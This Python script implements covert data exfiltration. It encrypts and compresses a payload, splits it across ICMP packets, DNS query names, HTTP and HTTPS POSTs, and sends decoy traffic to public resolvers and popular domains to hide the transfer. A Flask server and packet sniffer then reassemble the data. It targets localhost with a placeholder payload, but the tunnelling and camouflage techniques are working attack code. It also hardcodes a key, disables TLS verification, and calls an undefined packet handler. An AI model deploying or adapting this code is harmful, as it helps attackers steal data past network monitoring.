import os
import random
import time
import threading
import zlib
import base64
import hashlib
import requests
import ssl
from flask import Flask, request, jsonify
from scapy.all import IP, ICMP, UDP, TCP, DNS, DNSQR, Raw, send, sniff
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration
SECRET_KEY = "mysecretkey12345"
stop_sniffer = threading.Event()
dict_lock = threading.Lock()
received_chunks = {}
dns_servers = ["127.0.0.1"]
http_server_ip = "127.0.0.1"
http_server_port = 5000
chunk_size = 32

# Encryption and Compression
def encrypt_and_compress_payload(payload):
    compressed_payload = zlib.compress(payload.encode())
    key = hashlib.sha256(SECRET_KEY.encode()).digest()
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted = cipher.iv + cipher.encrypt(pad(compressed_payload, AES.block_size))
    return encrypted

def decrypt_and_decompress_payload(payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()
        iv = payload[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(payload[16:]), AES.block_size)
        decompressed = zlib.decompress(decrypted)
        return decompressed.decode()
    except Exception as e:
        raise ValueError(f"Error decrypting or decompressing payload: {e}")

# Split Payload
def split_payload(payload):
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    protocols = ['icmp', 'dns', 'http', 'https']
    assigned_chunks = {protocol: [] for protocol in protocols}

    for i, chunk in enumerate(payload_chunks):
        protocol = protocols[i % len(protocols)]
        assigned_chunks[protocol].append((i, chunk))
        print(f"[Debug] Assigned chunk index {i} to protocol {protocol}: {chunk}")

    return assigned_chunks

# Dummy Traffic
def send_dummy_traffic():
    while not stop_sniffer.is_set():
        traffic_type = random.choice(['icmp', 'dns', 'http', 'https'])
        if traffic_type == 'icmp':
            send_dummy_icmp()
        elif traffic_type == 'dns':
            send_dummy_dns()
        elif traffic_type == 'http':
            send_dummy_http()
        elif traffic_type == 'https':
            send_dummy_https()
        time.sleep(random.uniform(1, 3))

def send_dummy_icmp():
    target_ip = random.choice(['8.8.8.8', '1.1.1.1'])
    dummy_payload = os.urandom(random.randint(32, 64))
    packet = IP(dst=target_ip) / ICMP() / Raw(load=dummy_payload)
    send(packet, verbose=False)
    print(f"[Dummy ICMP] Sent dummy ICMP packet to {target_ip}")

def send_dummy_dns():
    domain = random.choice(['google.com', 'facebook.com', 'example.com'])
    packet = IP(dst=dns_servers[0]) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet, verbose=False)
    print(f"[Dummy DNS] Sent dummy DNS query for {domain}")

def send_dummy_http():
    http_payload = f"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n".encode()
    packet = IP(dst="127.0.0.1") / TCP(dport=80) / Raw(load=http_payload)
    send(packet, verbose=False)
    print("[Dummy HTTP] Sent dummy HTTP request")

def send_dummy_https():
    tls_payload = os.urandom(64)
    packet = IP(dst="127.0.0.1") / TCP(dport=443) / Raw(load=tls_payload)
    send(packet, verbose=False)
    print("[Dummy HTTPS] Sent dummy HTTPS packet")

# Flask Server for HTTP and HTTPS Reception
app = Flask(__name__)

@app.route('/receive_payload', methods=['POST'])
def receive_payload():
    data = request.json
    print(f"[HTTP/HTTPS - Debug] Received POST request: {data}")
    if not data or 'identifier' not in data or data['identifier'] != 'PAYLOAD':
        print("[HTTP/HTTPS] Invalid payload or missing identifier")
        return jsonify({"error": "Invalid payload"}), 400

    try:
        chunk_index = int(data['chunk_index'])
        chunk = base64.b64decode(data['chunk'])
        with dict_lock:
            if chunk_index not in received_chunks:
                received_chunks[chunk_index] = chunk
                print(f"[Receiver - HTTP/HTTPS] Received chunk index {chunk_index}: {chunk}")
            else:
                print(f"[Receiver - HTTP/HTTPS] Duplicate chunk index {chunk_index} ignored.")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"[Receiver - HTTP/HTTPS] Error: {e}")
        return jsonify({"error": str(e)}), 500

def start_http_server():
    app.run(host=http_server_ip, port=http_server_port, debug=False, use_reloader=False)

def start_https_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')  # Ensure these files exist
    app.run(host=http_server_ip, port=http_server_port + 1, ssl_context=context, debug=False, use_reloader=False)

# Send Payload
def send_icmp_payload(chunks, target_ip):
    for i, chunk in chunks:
        packet_payload = f"PAYLOAD|{i}|".encode() + chunk
        packet = IP(dst=target_ip) / ICMP() / Raw(load=packet_payload)
        send(packet, verbose=False)
        print(f"[Sender - ICMP] Sent chunk index {i} with payload: {packet_payload}")

def send_dns_payload(chunks):
    for i, chunk in chunks:
        chunk_b64 = base64.urlsafe_b64encode(chunk).decode().rstrip('=')
        query_name = f"PAYLOAD-{i}.{chunk_b64}.example.com"
        packet = IP(dst=dns_servers[0]) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
        send(packet, verbose=False)
        print(f"[Sender - DNS] Sent chunk index {i} as query: {query_name}")

def send_http_payload(chunks, target_ip):
    for i, chunk in chunks:
        url = f"http://{target_ip}:{http_server_port}/receive_payload"
        chunk_b64 = base64.b64encode(chunk).decode()
        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
        print(f"[Sender - HTTP] Sending POST request to {url} with data: {data}")
        try:
            response = requests.post(url, json=data)
            print(f"[Sender - HTTP] Response: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"[Sender - HTTP] Error sending chunk index {i}: {e}")

def send_https_payload(chunks, target_ip):
    for i, chunk in chunks:
        url = f"https://{target_ip}:{http_server_port + 1}/receive_payload"
        chunk_b64 = base64.b64encode(chunk).decode()
        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
        print(f"[Sender - HTTPS] Sending POST request to {url} with data: {data}")
        try:
            response = requests.post(url, json=data, verify=False)
            print(f"[Sender - HTTPS] Response: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"[Sender - HTTPS] Error sending chunk index {i}: {e}")

# Reassemble Payload
def reassemble_payload():
    with dict_lock:
        if received_chunks:
            print(f"[Reassembler] Received chunks: {list(received_chunks.keys())}")
            sorted_chunks = [received_chunks[key] for key in sorted(received_chunks.keys())]
            reassembled_payload = b''.join(sorted_chunks)
            print(f"[Reassembler] Reassembled payload (bytes): {reassembled_payload}")
            try:
                decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
                print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
            except Exception as e:
                print(f"[Receiver] Error reassembling payload: {e}")
        else:
            print("[Receiver] No chunks received.")

# Main
if __name__ == "__main__":
    target_ip = "127.0.0.1"
    text_payload = "This is my hardcoded payload. " * 50  # Increased payload size
    encrypted_payload = encrypt_and_compress_payload(text_payload)

    print(f"[Main] Encrypted payload size: {len(encrypted_payload)} bytes")
    assigned_chunks = split_payload(encrypted_payload)

    print("[Main] Starting HTTP server...")
    threading.Thread(target=start_http_server, daemon=True).start()

    print("[Main] Starting HTTPS server...")
    threading.Thread(target=start_https_server, daemon=True).start()

    print("[Main] Starting sniffer...")
    threading.Thread(
        target=lambda: sniff(
            filter="icmp or udp port 53 or tcp port 80 or tcp port 443",
            prn=process_packet,
            stop_filter=lambda x: stop_sniffer.is_set()
        ),
        daemon=True
    ).start()

    time.sleep(5)  # Allow servers and threads to initialize

    print("[Main] Sending payload over ICMP...")
    send_icmp_payload(assigned_chunks['icmp'], target_ip)

    print("[Main] Sending payload over DNS...")
    send_dns_payload(assigned_chunks['dns'])

    print("[Main] Sending payload over HTTP...")
    send_http_payload(assigned_chunks['http'], http_server_ip)

    print("[Main] Sending payload over HTTPS...")
    send_https_payload(assigned_chunks['https'], http_server_ip)

    time.sleep(10)  # Allow time for packets to be processed
    stop_sniffer.set()

    print("[Main] Reassembling payload...")
    reassemble_payload()
